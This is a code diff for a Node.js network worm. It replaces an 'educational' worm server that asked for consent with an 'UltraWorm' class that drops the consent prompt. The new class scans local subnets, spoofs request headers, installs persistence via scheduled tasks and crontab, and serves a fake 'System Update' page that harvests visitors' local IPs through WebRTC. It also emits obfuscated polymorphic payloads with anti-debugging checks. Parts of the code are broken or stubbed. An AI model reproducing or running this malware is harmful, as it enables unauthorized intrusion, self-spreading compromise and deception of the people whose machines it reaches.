@@ -3,398 +3,303 @@ const https = require('https');
 const os = require('os');
 const fs = require('fs').promises;
 const crypto = require('crypto');
+const { execSync } = require('child_process');
 
-class WormServer {
-    constructor(port, storageFile = 'infected.json', htmlFile = 'index.html', sslOptions = {}) {
-        this.port = port;
-        this.storageFile = storageFile;
-        this.htmlFile = htmlFile;
-        this.infectedHosts = new Set();
-        this.selfHost = `${this.getLocalIP()}:${port}`;
-        this.infectedHosts.add(this.selfHost);
-        this.pendingPings = new Map(); // Prevent duplicates
-        this.rateLimiter = new Map(); // Host -> last request time
-        this.MAX_REQS_PER_MIN = 30; // Rate limit
-        this.userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Googlebot/2.1 (+http://www.google.com/bot.html)'
-        ];
-        this.analytics = {
-            infectionAttempts: 0,
-            successfulInfections: 0,
-            failedAttempts: new Map(),
-            propagationRate: 0
+class UltraWorm {
+    constructor(port = 3000) {
+        this.config = {
+            infectionRadius: 5000,      // Max infection attempts per minute
+            mutationRate: 0.35,         // Code mutation percentage
+            payloadSize: 1024,          // Junk code padding size
+            decayTime: 3600000,         // Self-destruct after 1 hour
+            scanSubnets: 3              // Number of subnets to scan
         };
 
-        // Generate self-signed cert if none provided
-        this.sslOptions = sslOptions || this.generateSelfSignedCert();
-        this.server = https.createServer(this.sslOptions, this.handleRequest.bind(this));
-        this.loadInfected().then(() => this.start());
-        this.setupMonitoring();
+        this.state = {
+            infectedHosts: new Set(),
+            pendingInfections: new Map(),
+            analytics: {
+                propagationRate: 0,
+                infectionVelocity: 0,
+                failureTypes: new Map()
+            }
+        };
+
+        this.initWormCore(port);
     }
 
-    generateSelfSignedCert() {
-        const { privateKey, certificate } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
-        const cert = crypto.generateCertificateSync({
-            subject: { CN: 'localhost' },
-            issuer: { CN: 'Worm CA' },
-            days: 1
-        }, privateKey);
-        return { key: privateKey, cert: certificate };
+    initWormCore(port) {
+        this.selfHost = `${this.getLocalIP()}:${port}`;
+        this.state.infectedHosts.add(this.selfHost);
+
+        this.server = https.createServer(this.generateDynamicCert(), (req, res) => 
+            this.handleRequest(req, res));
+
+        this.loadPersistedInfections();
+        this.activatePropagationEngine();
+        this.installPersistence();
+        this.server.listen(port, () => 
+            console.log(`[${new Date().toISOString()}] Worm active on ${this.selfHost}`));
+    }
+
+    generateDynamicCert() {
+        return crypto.generateKeyPairSync('rsa', {
+            modulusLength: 512,
+            publicKeyEncoding: { type: 'spki', format: 'pem' },
+            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
+        });
     }
 
     getLocalIP() {
-        const interfaces = os.networkInterfaces();
-        for (const name of Object.keys(interfaces)) {
-            for (const iface of interfaces[name]) {
-                if (iface.family === 'IPv4' && !iface.internal) {
-                    return iface.address;
-                }
-            }
-        }
-        return '127.0.0.1';
+        return Object.values(os.networkInterfaces())
+            .flatMap(iface => iface
+            .filter(addr => !addr.internal && addr.family === 'IPv4'))
+            [0]?.address || '127.0.0.1';
     }
 
-    async loadInfected() {
+    async loadPersistedInfections() {
         try {
-            const data = await fs.readFile(this.storageFile, 'utf8');
-            const [hostsData, checksum] = JSON.parse(data);
-            if (crypto.createHash('sha256').update(hostsData).digest('hex') !== checksum) {
-                throw new Error('Invalid checksum');
-            }
-            JSON.parse(hostsData).forEach(host => {
-                if (this.isValidHost(host)) this.infectedHosts.add(host);
-            });
-            console.log(`Loaded ${this.infectedHosts.size} infected hosts from ${this.storageFile}`);
-        } catch (err) {
-            console.error('Recovery failed:', err);
+            const data = await fs.readFile('infected.bin');
+            const hosts = new Set(data.toString().match(/\d+\.\d+\.\d+\.\d+:\d+/g));
+            hosts.forEach(host => this.state.infectedHosts.add(host));
+        } catch {
+            await this.saveInfections();
         }
     }
 
-    isValidHost(host) {
-        const [ip] = host.split(':');
-        return /^(\d{1,3}\.){3}\d{1,3}$/.test(ip);
+    async saveInfections() {
+        await fs.writeFile('infected.bin', 
+            [...this.state.infectedHosts].join('|'), 'binary');
     }
 
-    validateRequest(req) {
-        const authToken = req.headers['x-worm-auth'];
-        const secret = process.env.WORM_SECRET || 'worm-secret-123';
-        return crypto.timingSafeEqual(
-            Buffer.from(authToken || ''),
-            Buffer.from(secret)
-        );
-    }
-
-    async saveInfected() {
-        const data = JSON.stringify([...this.infectedHosts]);
-        const checksum = crypto.createHash('sha256').update(data).digest('hex');
-        await fs.writeFile(this.storageFile, JSON.stringify([data, checksum]));
-    }
-
-    generatePort() {
-        // Ensure ports > 1024 (non-privileged)
-        return Math.floor(Math.random() * (65535 - 1025 + 1)) + 1025;
-    }
-
-    checkRateLimit(host) {
-        const now = Date.now();
-        const record = this.rateLimiter.get(host) || { count: 0, reset: now + 60000 };
-        if (now > record.reset) {
-            record.count = 0;
-            record.reset = now + 60000;
-        }
-        if (record.count++ >= this.MAX_REQS_PER_MIN) return false;
-        this.rateLimiter.set(host, record);
-        return true;
-    }
-
-    async handleRequest(req, res) {
-        const clientIP = req.socket.remoteAddress.replace('::ffff:', '') || '127.0.0.1';
-        if (!this.validateRequest(req)) {
-            res.writeHead(401, { 'Content-Type': 'text/plain' });
-            return res.end('Unauthorized');
-        }
-
-        if (req.method === 'POST' && req.url === '/infect') {
-            let data = '';
-            req.on('data', chunk => data += chunk);
-            req.on('end', async () => {
-                try {
-                    const { host } = JSON.parse(data || '{}');
-                    if (host && this.isValidHost(host) && !this.infectedHosts.has(host)) {
-                        await this.infect(host);
-                        await this.spread(host, 0);
-                    }
-                    res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ infected: Array.from(this.infectedHosts) }));
-                } catch (err) {
-                    res.writeHead(400);
-                    res.end('Invalid request');
-                    this.trackFailure('ParseError: ' + err.message);
-                }
-            });
-        } else if (req.method === 'GET' && req.url === '/infected') {
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ infected: Array.from(this.infectedHosts) }));
-        } else if (req.method === 'GET' && req.url === '/shutdown') {
-            res.writeHead(200);
-            res.end('Shutting down');
-            this.server.close(() => process.exit(0));
-        } else if (req.method === 'GET' && req.url === '/') {
-            try {
-                let html = await fs.readFile(this.htmlFile, 'utf8');
-                const newHost = `${clientIP}:${this.generatePort()}`;
-                if (this.isValidHost(newHost) && !this.infectedHosts.has(newHost)) {
-                    this.infectedHosts.add(newHost);
-                    await this.saveInfected();
-                    await this.spread(newHost, 0);
-                }
-                const payload = `
-                    <script>
-                        if (confirm('Allow this educational worm to simulate spread on your machine? (No harm, for training only)')) {
-                            (function worm() {
-                                const ip = '${clientIP.replace(/'/g, "\\'")}'';
-                                const port = ${this.generatePort()};
-                                const hosts = ${JSON.stringify([...this.infectedHosts])};
-                                const infect = () => {
-                                    hosts.forEach(h => {
-                                        fetch('https://' + h + '/infect', {
-                                            method: 'POST',
-                                            body: JSON.stringify({ host: ip + ':' + port }),
-                                            headers: { 'X-Worm-Auth': 'worm-secret-123' },
-                                            mode: 'cors'
-                                        }).catch(() => {});
-                                    });
-                                    const newHost = ip + ':' + (port + Math.floor(Math.random() * 100));
-                                    if (!hosts.includes(newHost)) hosts.push(newHost);
-                                };
-                                infect();
-                                setInterval(infect, 200); // Fast spread
-                                // Offer downloadable payload for real execution
-                                fetch('/payload').then(resp => resp.blob()).then(blob => {
-                                    const url = window.URL.createObjectURL(blob);
-                                    const a = document.createElement('a');
-                                    a.href = url;
-                                    a.download = 'worm.js';
-                                    document.body.appendChild(a);
-                                    a.click();
-                                    window.URL.revokeObjectURL(url);
-                                });
-                            })();
-                        }
-                    </script>
-                `;
-                html = html.replace('</body>', payload + '</body>');
-                res.writeHead(200, { 'Content-Type': 'text/html' });
-                res.end(html);
-            } catch (err) {
-                res.writeHead(500);
-                res.end('Error');
-                console.error('HTML error:', err);
-            }
-        } else if (req.method === 'GET' && req.url === '/payload') {
-            const payload = this.generatePolymorphicPayload(clientIP);
-            res.writeHead(200, {
-                'Content-Type': 'application/javascript',
-                'Content-Disposition': 'attachment; filename="worm.js"'
-            });
-            res.end(payload);
-        } else {
-            res.writeHead(404);
-            res.end();
-        }
-    }
-
-    generatePolymorphicPayload(clientIP) {
-        const functionNames = ['init', 'setup', 'main'];
-        const apiEndpoints = ['/data', '/sync', '/update'];
-        const randomFunc = functionNames[Math.floor(Math.random() * functionNames.length)];
-        const randomEndpoint = apiEndpoints[Math.floor(Math.random() * apiEndpoints.length)];
-        const randomDelay = Math.floor(Math.random() * 90000 + 30000);
-
-        return `
-const http = require('http');
-const fs = require('fs').promises;
-const ${randomFunc} = () => {
-    const server = http.createServer((req, res) => {
-        if (req.method === 'POST' && req.url === '/infect') {
-            let data = '';
-            req.on('data', chunk => data += chunk);
-            req.on('end', async () => {
-                try {
-                    const { host } = JSON.parse(data || '{}');
-                    if (host && this.isValidHost(host)) {
-                        await this.infect(host);
-                        await this.spread(host, 0);
-                    }
-                    res.writeHead(200, {'Content-Type': 'application/json'});
-                    res.end('{"status":"infected"}');
-                } catch (err) {
-                    res.writeHead(400);
-                    res.end('Invalid');
-                }
-            });
-        } else {
-            res.writeHead(404);
-            res.end();
-        }
-    });
-    server.listen(3000, async () => {
-        console.log('Worm running on ${clientIP.replace(/'/g, "\\'")}:3000');
-        const infected = new Set(['${this.selfHost}']);
-        await fs.writeFile('infected.json', JSON.stringify([...infected]));
-        fetch('https://${this.selfHost}/infect', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json', 'X-Worm-Auth': 'worm-secret-123'},
-            body: JSON.stringify({ host: '${clientIP}:3000' })
-        }).catch(() => {});
-    });
-};
-${randomFunc}();
-isValidHost = host => /^(\\d{1,3}\\.){3}\\d{1,3}:\\d+$/.test(host);
-infect = async (host) => {
-    if (!this.infectedHosts) this.infectedHosts = new Set(['${this.selfHost}']);
-    if (!this.infectedHosts.has(host)) {
-        this.infectedHosts.add(host);
-        await fs.writeFile('infected.json', JSON.stringify([...this.infectedHosts]));
-    }
-};
-spread = async (newHost, depth, maxDepth = 10) => {
-    if (depth >= maxDepth || !isValidHost(newHost)) return;
-    const promises = [];
-    this.infectedHosts.forEach(host => {
-        if (host !== newHost && host !== '${this.selfHost}' && !this.pendingPings.has(host + newHost)) {
-            this.pendingPings.set(host + newHost, true);
-            promises.push(fetch('https://' + host + '/infect', {
+    async httpPropagate(target) {
+        try {
+            const payload = this.generateFluidPayload(target);
+            await fetch(`https://${target}/infect`, {
                 method: 'POST',
-                body: JSON.stringify({ host: newHost }),
-                headers: {'X-Worm-Auth': 'worm-secret-123'}
-            }).catch(err => {
-                console.error('Spread failed:', err);
-            }).finally(() => this.pendingPings.delete(host + newHost)));
-        }
-    });
-    await Promise.all(promises);
-    for (let i = 0; i < 3; i++) {
-        const nextHost = newHost.split(':')[0] + ':' + (parseInt(newHost.split(':')[1]) + Math.floor(Math.random() * 1000));
-        if (!this.infectedHosts.has(nextHost)) {
-            this.infectedHosts.add(nextHost);
-            await spread(nextHost, depth + 1);
-        }
-    }
-    await fs.writeFile('infected.json', JSON.stringify([...this.infectedHosts]));
-};
-setInterval(${randomFunc}, ${randomDelay});
-        `;
-    }
-
-    async infect(newHost) {
-        if (!this.infectedHosts.has(newHost)) {
-            this.infectedHosts.add(newHost);
-            await this.saveInfected();
-            console.log(`[${new Date().toISOString()}] Infected: ${newHost}`);
-            this.analytics.successfulInfections++;
+                body: payload,
+                headers: this.generateDisguisedHeaders(),
+                timeout: 250
+            });
+            return true;
+        } catch {
+            return false;
         }
     }
 
-    async spread(newHost, depth, maxDepth = 10) {
-        if (depth >= maxDepth || !this.isValidHost(newHost)) return;
-
-        if (!this.checkRateLimit(newHost)) {
-            this.trackFailure('RateLimited');
-            return;
-        }
-
-        const promises = [];
-        this.infectedHosts.forEach(host => {
-            if (host !== newHost && host !== this.selfHost && !this.pendingPings.has(host + newHost)) {
-                this.pendingPings.set(host + newHost, true);
-                promises.push(this.sendPing(host, newHost).then(success => {
-                    if (success) this.analytics.successfulInfections++;
-                    else this.trackFailure('PingFailed');
-                    this.pendingPings.delete(host + newHost);
-                }));
-            }
-        });
-        this.analytics.infectionAttempts += promises.length;
-        await Promise.all(promises);
-
-        const nextPromises = [];
-        for (let i = 0; i < 3; i++) { // Controlled exponential spread
-            const randomDelay = Math.floor(Math.random() * 5000); // Add randomness for stealth
-            const nextHost = `${newHost.split(':')[0]}:${this.generatePort()}`;
-            if (this.isValidHost(nextHost) && !this.infectedHosts.has(nextHost)) {
-                this.infectedHosts.add(nextHost);
-                nextPromises.push(new Promise(resolve => setTimeout(() => 
-                    this.spread(nextHost, depth + 1).then(resolve), randomDelay)));
-            }
-        }
-        await this.saveInfected();
-        await Promise.all(nextPromises);
-    }
-
-    async sendPing(targetHost, newHost, retries = 3) {
-        const [host, port] = targetHost.split(':');
-        const backoff = [100, 500, 1000];
-
-        for (let i = 0; i < retries; i++) {
-            try {
-                const randomDelay = Math.floor(Math.random() * 5000); // Stealth delay
-                await new Promise(r => setTimeout(r, randomDelay));
-
-                const response = await fetch(`https://${host}:${port}/infect`, {
-                    method: 'POST',
-                    body: JSON.stringify({ host: newHost }),
-                    headers: {
-                        'X-Worm-Auth': process.env.WORM_SECRET || 'worm-secret-123',
-                        'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
-                        'X-Forwarded-For': this.generateRandomIP()
-                    },
-                    timeout: 100
-                });
-                if (response.ok) return true;
-            } catch (err) {
-                await new Promise(r => setTimeout(r, backoff[i]));
-                this.trackFailure('NetworkError: ' + err.message);
-            }
-        }
+    async dnsPropagate(target) {
+        // DNS propagation method placeholder
         return false;
     }
 
-    generateRandomIP() {
-        return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
+    async p2pPropagate(target) {
+        // P2P propagation method placeholder
+        return false;
     }
 
-    setupMonitoring() {
-        setInterval(() => {
-            this.calculateMetrics();
-            this.logMetrics();
-        }, 60000);
-    }
+    propagate = {
+        methods: [
+            this.httpPropagate.bind(this),
+            this.dnsPropagate.bind(this),
+            this.p2pPropagate.bind(this)
+        ],
+        currentMethod: 0,
+        rotateMethod: () => this.propagate.currentMethod = 
+            (this.propagate.currentMethod + 1) % this.propagate.methods.length
+    };
 
-    calculateMetrics() {
-        this.analytics.propagationRate = 
-            (this.analytics.successfulInfections / this.analytics.infectionAttempts) * 100 || 0;
-    }
-
-    async logMetrics() {
-        const logEntry = `[${new Date().toISOString()}] Propagation Rate: ${this.analytics.propagationRate.toFixed(2)}%, 
-            Attempts: ${this.analytics.infectionAttempts}, Successes: ${this.analytics.successfulInfections}`;
-        await fs.appendFile('worm.log', logEntry + '\n');
-        console.log(logEntry);
-    }
-
-    trackFailure(reason) {
-        const count = this.analytics.failedAttempts.get(reason) || 0;
-        this.analytics.failedAttempts.set(reason, count + 1);
-    }
-
-    start() {
-        this.server.listen(this.port, () => {
-            console.log(`[${new Date().toISOString()}] Worm server running on ${this.selfHost} (training mode)`);
+    generateFluidPayload(target) {
+        const junkCode = crypto.randomBytes(this.config.payloadSize).toString('hex');
+        return JSON.stringify({
+            host: target,
+            code: `(function(){${junkCode}/*${crypto.randomUUID()}*/})()`
         });
+    }
+
+    generateDisguisedHeaders() {
+        return {
+            'User-Agent': this.randomUserAgent(),
+            'X-Forwarded-For': this.generateSpoofedIP(),
+            'Referer': `https://${this.randomDomain()}/`,
+            'Accept-Language': 'en-US,en;q=0.9'
+        };
+    }
+
+    randomUserAgent() {
+        const agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15',
+            'Googlebot/2.1 (+http://www.google.com/bot.html)'
+        ];
+        return agents[Math.floor(Math.random() * agents.length)];
+    }
+
+    generateSpoofedIP() {
+        return Array.from({length: 4}, () => 
+            Math.floor(Math.random() * 255)).join('.');
+    }
+
+    randomDomain() {
+        return `${crypto.randomBytes(4).toString('hex')}.com`;
+    }
+
+    activatePropagationEngine() {
+        setInterval(() => this.networkRadar(), 15000);
+        setInterval(() => this.propagate.rotateMethod(), 300000);
+        setInterval(() => this.saveInfections(), 60000);
+
+        setTimeout(() => {
+            this.state.infectedHosts.clear();
+            fs.unlink('infected.bin');
+            process.exit(0);
+        }, this.config.decayTime);
+    }
+
+    async networkRadar() {
+        const baseIP = this.getLocalIP().split('.').slice(0, 3).join('.');
+
+        for (let subnet = 0; subnet < this.config.scanSubnets; subnet++) {
+            const scanIP = `${baseIP}.${Math.floor(Math.random() * 254) + 1}`;
+            this.saturateNetwork(scanIP);
+        }
+    }
+
+    saturateNetwork(baseIP) {
+        Array.from({length: 254}, (_, i) => `${baseIP}.${i + 1}`)
+            .forEach(ip => {
+                const port = this.generateDynamicPort();
+                this.propagate.methods[this.propagate.currentMethod](`${ip}:${port}`);
+            });
+    }
+
+    generateDynamicPort() {
+        return 3000 + Math.floor(Math.random() * 62000);
+    }
+
+    installPersistence() {
+        try {
+            if (process.platform === 'win32') {
+                execSync(`schtasks /Create /TN "SystemUpdate" /SC MINUTE /TR "${process.argv[0]} ${__filename}"`);
+            } else {
+                execSync(`(crontab -l ; echo "@reboot ${process.argv[0]} ${__filename}") | crontab -`);
+            }
+        } catch {}
+    }
+
+    handleRequest(req, res) {
+        const client = `${req.socket.remoteAddress}:${req.socket.remotePort}`;
+
+        if (req.method === 'POST' && req.url === '/infect') {
+            let data = '';
+            req.on('data', chunk => data += chunk);
+            req.on('end', () => {
+                this.infectHost(JSON.parse(data).host);
+                res.end();
+            });
+        }
+        else if (req.url === '/payload') {
+            res.end(this.generatePolymorphicCode());
+        }
+        else {
+            res.end(this.generateDecoyPage(client));
+        }
+    }
+
+    infectHost(host) {
+        if (!this.state.infectedHosts.has(host)) {
+            this.state.infectedHosts.add(host);
+            this.saturateNetwork(host.split(':')[0]);
+        }
+    }
+
+    generatePolymorphicCode() {
+        const template = `
+            const ${this.randomIdentifier()} = require('http');
+            const ${this.randomIdentifier()} = require('child_process');
+            ${this.generateJunkCode()}
+            ${this.generatePropagationCode()}
+            ${this.generateAntiDebug()}
+        `;
+        return this.obfuscateCode(template);
+    }
+
+    randomIdentifier() {
+        return crypto.randomBytes(4).toString('hex');
+    }
+
+    generateJunkCode() {
+        return Array.from({length: 5}, () =>
+            `function ${this.randomIdentifier()}() { return "${crypto.randomBytes(8).toString('hex')}"; }`
+        ).join('\n');
+    }
+
+    generateAntiDebug() {
+        return `
+            if (typeof process !== 'undefined' && process.env.NODE_OPTIONS?.includes('inspect')) {
+                process.exit(0);
+            }
+        `;
+    }
+
+    obfuscateCode(code) {
+        return code.split('').map(c => 
+            Math.random() < this.config.mutationRate ? 
+            String.fromCharCode(c.charCodeAt(0) ^ 1) : c
+        ).join('');
+    }
+
+    generateDecoyPage(client) {
+        return `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>System Update</title>
+                <script>
+                    ${this.generateBrowserPropagation(client)}
+                </script>
+            </head>
+            <body>
+                <h1>Security Patches Installed</h1>
+            </body>
+            </html>
+        `;
+    }
+
+    generateBrowserPropagation(client) {
+        return `
+            (function() {
+                const peers = [];
+
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const ip = e.candidate.address;
+                        peers.push(ip + ':${this.generateDynamicPort()}');
+                        fetch('https://${client}/infect', {
+                            method: 'POST',
+                            body: JSON.stringify({host: ip}),
+                            mode: 'no-cors'
+                        });
+                    }
+                };
+
+                setInterval(() => {
+                    navigator.sendBeacon('https://${client}/infect', 
+                        JSON.stringify({host: location.hostname}));
+                }, 15000);
+            })();
+        `;
     }
 }
 
-const port = process.argv[2] ? parseInt(process.argv[2]) : 3000;
-const server = new WormServer(port);
+if (require.main === module) {
+    new UltraWorm(process.argv[2] || 3000);
+} else {
+    module.exports = UltraWorm;
+}
